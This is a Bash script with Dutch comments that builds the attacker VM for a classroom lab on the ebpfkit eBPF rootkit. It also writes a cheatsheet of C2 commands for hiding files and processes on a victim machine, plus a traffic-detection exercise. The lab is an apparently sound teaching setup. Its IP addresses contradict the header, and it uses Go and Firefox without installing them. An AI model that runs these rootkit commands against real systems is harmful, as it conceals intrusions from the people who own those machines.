#!/bin/bash
# ============================================================================
# ebpfkit Rootkit Lab - Aanvaller Setup Script
# ============================================================================
# Dit script bereidt de AANVALLER-VM voor met:
#   - Statisch IP: 192.168.56.20
#   - ebpfkit-client (gecompileerd vanuit broncode)
#   - Wireshark (voor C2 verkeersanalyse)
#   - Firefox (voor webapp UI op slachtoffer)
#   - Cheatsheet voor studenten op het bureaublad
#
# Vereisten:
#   - Ubuntu 20.04 (Focal), gebruiker 'student' met sudo-rechten
#   - Host-only netwerk: slachtoffer op 192.168.56.10, aanvaller op 192.168.56.20
#
# Volgorde:
#   1. Statisch IP instellen
#   2. Dependencies installeren (Go, git, build tools)
#   3. ebpfkit klonen en ebpfkit-client compileren
#   4. Wireshark installeren en configureren
#   5. Cheatsheet aanmaken op bureaublad
#   6. Verificatie
# ============================================================================

set -e

VICTIM_IP="192.168.56.101"
ATTACKER_IP="192.168.56.100"
EBPFKIT_CLIENT="/opt/ebpfkit/bin/ebpfkit-client"
WEBAPP_PORT="8080"

echo "=== STAP 1: Statisch IP Instellen ==="
# Netplan configuratie voor host-only adapter (doorgaans enp0s8 in VirtualBox)
# Pas de interfacenaam aan als 'ip a' een andere naam toont.
IFACE=$(ip -o link show | awk -F': ' '{print $2}' | grep -v lo | tail -1)
echo "Gevonden netwerkinterface: $IFACE"

sudo tee /etc/netplan/01-hostonly.yaml > /dev/null << EOF
network:
  version: 2
  ethernets:
    ${IFACE}:
      addresses:
        - ${ATTACKER_IP}/24
      nameservers:
        addresses: [8.8.8.8]
EOF

sudo netplan apply
echo "Statisch IP ingesteld: ${ATTACKER_IP}"

echo ""
echo "=== STAP 2: Dependencies Installeren ==="
sudo apt update && sudo apt upgrade -y
sudo apt install -y \
    build-essential \
    git \
    curl \
    wget \
    net-tools \
    wireshark \
    terminator

# go-bindata (vereist door ebpfkit build)
export PATH=$PATH:$(go env GOPATH)/bin
go install github.com/shuLhan/go-bindata/cmd/go-bindata@latest 2>/dev/null || \
    go get -u github.com/shuLhan/go-bindata/... 2>/dev/null || true

echo ""
echo "=== STAP 3: ebpfkit Klonen en ebpfkit-client Compileren ==="
cd /opt
sudo git clone https://github.com/Gui774ume/ebpfkit.git
sudo chown -R $(whoami):$(whoami) /opt/ebpfkit
cd /opt/ebpfkit

export PATH=$PATH:$(go env GOPATH)/bin

# Alleen ebpfkit-client compileren (de aanvaller heeft de kernel-binary niet nodig)
make ebpfkit-client 2>/dev/null || make

echo "ebpfkit-client binary:"
ls -lh bin/ebpfkit-client

# Symlink zodat het overal bereikbaar is
sudo ln -sf /opt/ebpfkit/bin/ebpfkit-client /usr/local/bin/ebpfkit-client

echo ""
echo "=== STAP 4: Wireshark Configureren ==="
# Wireshark toestaan voor niet-root gebruikers
sudo dpkg-reconfigure -p low wireshark-common <<< "yes" || true
sudo usermod -aG wireshark $(whoami)
echo "Wireshark geconfigureerd. Log opnieuw in om zonder sudo te draaien."

echo ""
echo "=== STAP 5: Cheatsheet Aanmaken op Bureaublad ==="
mkdir -p ~/Desktop

cat > ~/Desktop/C2-CHEATSHEET.txt << 'CHEAT'
==========================================================================
  ebpfkit C2 Lab — Aanvaller Cheatsheet
==========================================================================

NETWERK
  Slachtoffer IP : 192.168.56.101
  Aanvaller IP   : 192.168.56.100
  C2 Poort       : 8080

------------------------------------------------------------------
STAP 1: Controleer verbinding met slachtoffer
------------------------------------------------------------------
  ping 192.168.56.101

------------------------------------------------------------------
STAP 2: Webapp UI bekijken (browser)
------------------------------------------------------------------
  Open Firefox en ga naar:
    http://192.168.56.101:8080

  Dit is de verborgen webinterface van ebpfkit op het slachtoffer.

------------------------------------------------------------------
STAP 3: ebpfkit-client gebruiken (CLI)
------------------------------------------------------------------
  Syntaxis:
    ebpfkit-client --help

  Verbinden met de rootkit op het slachtoffer:
    ebpfkit-client -t http://192.168.56.101:8080

  Beschikbare commando's (voorbeelden):

  [Bestand verbergen]
    ebpfkit-client -t http://192.168.56.101:8080 add-hidden-file \
      --filename geheim.txt

  [Bestand zichtbaar maken]
    ebpfkit-client -t http://192.168.56.101:8080 rm-hidden-file \
      --filename geheim.txt

  [Proces verbergen op PID]
    ebpfkit-client -t http://192.168.56.101:8080 add-hidden-process \
      --pid 1337

  [Lijst van verborgen items]
    ebpfkit-client -t http://192.168.56.101:8080 list-hidden-files
    ebpfkit-client -t http://192.168.56.101:8080 list-hidden-processes

------------------------------------------------------------------
STAP 4: Netwerkverkeer analyseren met Wireshark
------------------------------------------------------------------
  Start Wireshark op interface enp0s8 (of de host-only adapter):
    sudo wireshark &

  Filter voor C2-verkeer naar/van slachtoffer:
    ip.addr == 192.168.56.101 && tcp.port == 8080

  Wat zie je?
    - HTTP GET/POST naar de webapp
    - ebpfkit verbergt dit verkeer op het SLACHTOFFER (XDP hook)
    - Maar vanop de AANVALLER is het gewoon zichtbaar!
    -> Dit illustreert waarom C2-detectie best buiten het besmette
       systeem gebeurt (bijv. via IDS, netflow, of hypervisor-niveau)

------------------------------------------------------------------
DETECTIE-UITDAGING (voor studenten)
------------------------------------------------------------------
  Ga naar de SLACHTOFFER-VM en probeer het C2-verkeer te zien:
    sudo tcpdump -i any port 8080

  Wat merk je? Vergelijk dit met Wireshark op de aanvaller-VM.
  Waarom is er een verschil?

==========================================================================
CHEAT

chmod 644 ~/Desktop/C2-CHEATSHEET.txt
echo "Cheatsheet aangemaakt op ~/Desktop/C2-CHEATSHEET.txt"

echo ""
echo "=== STAP 6: Verificatie ==="

echo "--- Netwerk ---"
ip a show | grep "${ATTACKER_IP}" && echo "OK: Statisch IP ${ATTACKER_IP} actief" || echo "FOUT: IP niet ingesteld!"

echo ""
echo "--- ebpfkit-client ---"
ebpfkit-client --help > /dev/null 2>&1 && echo "OK: ebpfkit-client werkt" || echo "FOUT: ebpfkit-client niet gevonden!"

echo ""
echo "--- Wireshark ---"
which wireshark > /dev/null && echo "OK: Wireshark geïnstalleerd" || echo "FOUT: Wireshark ontbreekt!"

echo ""
echo "--- Firefox ---"
which firefox > /dev/null && echo "OK: Firefox geïnstalleerd" || echo "FOUT: Firefox ontbreekt!"

echo ""
echo "--- Bereikbaarheid slachtoffer ---"
ping -c 2 "${VICTIM_IP}" > /dev/null 2>&1 && \
    echo "OK: Slachtoffer ${VICTIM_IP} bereikbaar" || \
    echo "WAARSCHUWING: Slachtoffer niet bereikbaar (start die VM eerst)"

echo ""
echo "============================================================================"
echo "KLAAR! De aanvaller-VM is geconfigureerd."
echo ""
echo "Volgende stap: sluit de VM af en exporteer als .ova:"
echo "  sudo shutdown -h now"
echo "  VBoxManage export \"ebpfkit-Aanvaller\" -o ebpfkit-Aanvaller.ova"
echo ""
echo "Studenten hoeven enkel nog in te loggen en de cheatsheet te volgen."
echo "============================================================================"
